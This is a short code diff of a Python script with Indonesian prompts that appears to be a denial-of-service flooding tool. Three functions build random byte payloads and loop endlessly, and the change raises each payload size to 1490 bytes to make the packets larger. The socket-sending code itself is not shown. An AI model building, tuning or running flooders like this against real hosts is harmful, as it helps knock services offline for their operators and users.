@@ -32,7 +32,7 @@ threads = int(input("MAU BERAPA LAMA |Threads:"))
 
 os.system("clear")
 def run():
-	data = random._urandom(1180)
+	data = random._urandom(1490)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
@@ -45,7 +45,7 @@ def run():
 			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 
 def run2():
-	data = random._urandom(1025)
+	data = random._urandom(1490)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
@@ -60,7 +60,7 @@ def run2():
 			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 
 def run3():
-	data = random._urandom(1024)
+	data = random._urandom(1490)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
